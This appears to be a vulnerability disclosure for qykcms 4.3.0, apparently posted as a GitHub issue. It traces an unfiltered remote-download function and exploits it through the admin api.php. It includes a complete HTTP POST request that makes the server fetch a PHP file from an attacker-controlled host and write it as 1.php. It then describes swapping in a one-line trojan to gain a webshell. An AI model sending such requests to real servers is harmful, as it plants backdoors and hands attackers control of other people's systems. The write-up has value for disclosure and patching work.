qykcms_ 4.3.0\wwwroot\admin_ A vulnerability exists in the 645-657 line downfile() function in system  include  function.php, which uses file_ get_ Contents() reads $url, and then uses file_ put_ The contents() function performs a write operation, only determining whether the file exists, without filtering the file content, file source, and file suffix

![image](https://user-images.githubusercontent.com/79570367/225640907-2ebbd786-2b6c-449c-8619-c19e99e96f44.png)

Global search downfile() function
qykcms_ 4.3.0\wwwroot\admin_ system\include\lib\down.php
Line 4 calls the downfile () function directly without filtering

![image](https://user-images.githubusercontent.com/79570367/225641018-066d9a7c-9580-4de8-9173-46c91c8d2352.png)

Qykcms All background file operations are performed through  wwwroot  admin_ System  api.php. $tcz receives post data and generates an array

![image](https://user-images.githubusercontent.com/79570367/225641125-4116b2cb-6c60-4d09-8078-5b5549ced88d.png)

Use switch to judge log parameters

![image](https://user-images.githubusercontent.com/79570367/225641234-07fbc338-3770-43da-a7ec-c334a74b2ea0.png)

When the parameter log is down, include/lib/down.php is included and executed
The vulnerability point is in the system - upgrade system - automatic upgrade

![image](https://user-images.githubusercontent.com/79570367/225641291-54c48afa-9e63-4b6d-93b9-bd4c121581dc.png)

Packet:
POST /admin_system/api.php HTTP/1.1
Host: 192.168.57.1:81
Accept: */*
Accept-Encoding: gzip, deflate
Origin: file://
Accept-Language: zh-CN,en,*
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Safari/535.2 wke/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Connection: close

admin=admin&key=3ba2d1dbeb29f11cf2fb44b77c8d19c1&log=down&downurl=http://192.168.57.2/&filename=1.php

Create a phpinfo file 1.php on the remote host and start the http.server service：

![image](https://user-images.githubusercontent.com/79570367/225641405-19cfe315-cc31-4c38-8cb9-54c8d4813b3a.png)

Send a request packet. The downurl is the IP+port of the vps, and the filename is the file name

![image](https://user-images.githubusercontent.com/79570367/225641500-309e108b-2dbb-4aaf-aaf0-5b6d7d35a510.png)

Access the returned path

![image](https://user-images.githubusercontent.com/79570367/225641571-4e48c4ff-7ed3-4121-bbbf-0fc79336043a.png)

Modify it to a one-sentence Trojan horse, send the data package to the server to download, and successfully obtain the webshell

![image](https://user-images.githubusercontent.com/79570367/225641703-295d58aa-82a3-468d-8439-4966c3f9633f.png)
